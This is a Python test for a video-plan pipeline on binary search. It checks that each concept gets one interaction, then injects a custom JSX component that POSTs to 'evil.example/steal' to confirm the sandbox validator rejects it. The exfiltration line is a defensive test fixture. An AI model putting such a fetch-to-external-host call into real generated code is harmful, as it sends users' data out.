"""Phase 11 end-of-phase test: run the full pipeline through Validate (now including
interactions) and confirm interactions.json is correct, then inject a sandbox
violation to confirm the validator catches it.

Run with: uv run python tests/test_phase11_interactions.py
"""

from __future__ import annotations

import copy
import json
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from app.jobs import create_job, job_dir_for, read_artifact
from app.orchestrator import run_pipeline
from app.schemas.concepts import Concepts
from app.schemas.enums import JobStatus
from app.schemas.input import JobInput
from app.schemas.interactions import Interactions
from app.validation import validator

TOPIC = "Binary search algorithm"


def main() -> None:
    job_id = create_job(JobInput(topic=TOPIC, audience="undergrad CS students", durationSec=90))
    job_dir = job_dir_for(job_id)

    manifest = run_pipeline(job_id, up_to="validate")
    print(f"job_id={job_id}")
    print(f"manifest.status={manifest.status}, stages_done={manifest.stages_done}")
    assert manifest.status != JobStatus.FAILED, f"pipeline failed: {manifest.error}"
    assert not (job_dir / "validation_errors.json").exists(), "validator reported errors on the clean plan"

    concepts = read_artifact(job_dir, "concepts", Concepts)
    interactions = read_artifact(job_dir, "interactions", Interactions)

    valid_ids = {c.id for c in concepts.concepts}
    used_ids = [i.concept_id for i in interactions.interactions]
    assert set(used_ids) == valid_ids, f"coverage mismatch: used={set(used_ids)} valid={valid_ids}"
    assert len(used_ids) == len(set(used_ids)), "duplicate concept_id in interactions"
    assert len(interactions.interactions) == len(concepts.concepts), "not exactly one interaction per concept"

    print(f"\ninteractions.json: {len(interactions.interactions)} interactions, one per concept: OK")
    for i in interactions.interactions:
        print(f"  {i.concept_id}: type={i.type.value:<15} title={i.title!r}")
        if i.type.value == "custom":
            print(f"    custom.entry={i.custom.entry}")

    # --- inject a sandbox violation and confirm the validator rejects it ---
    plan = json.loads((job_dir / "video_plan.json").read_text(encoding="utf-8"))
    good_interactions = json.loads((job_dir / "interactions.json").read_text(encoding="utf-8"))
    broken = copy.deepcopy(good_interactions)
    broken["interactions"][0]["type"] = "custom"
    broken["interactions"][0]["props"] = {}
    broken["interactions"][0]["custom"] = {
        "entry": "Evil.jsx",
        "code": "export default function Evil() { fetch('https://evil.example/steal', {method: 'POST'}); return null; }",
    }
    (job_dir / "interactions.json").write_text(json.dumps(broken), encoding="utf-8")
    try:
        validator.run(job_dir)
        raise AssertionError("expected validator to reject a custom interaction containing fetch(")
    except ValueError as exc:
        errors_doc = json.loads((job_dir / "validation_errors.json").read_text(encoding="utf-8"))
        assert any("sandbox" in e["message"] or "fetch" in e["message"] for e in errors_doc["errors"]), errors_doc
        print(f"\ninjected fetch() sandbox violation: caught as expected ({exc})")

    # restore the good interactions.json and confirm validator passes again
    (job_dir / "interactions.json").write_text(json.dumps(good_interactions), encoding="utf-8")
    (job_dir / "validation_errors.json").unlink()
    validator.run(job_dir)
    print("restored good interactions.json: validator passes again: OK")

    print("\nPhase 11 test: ALL PASSED")


if __name__ == "__main__":
    main()
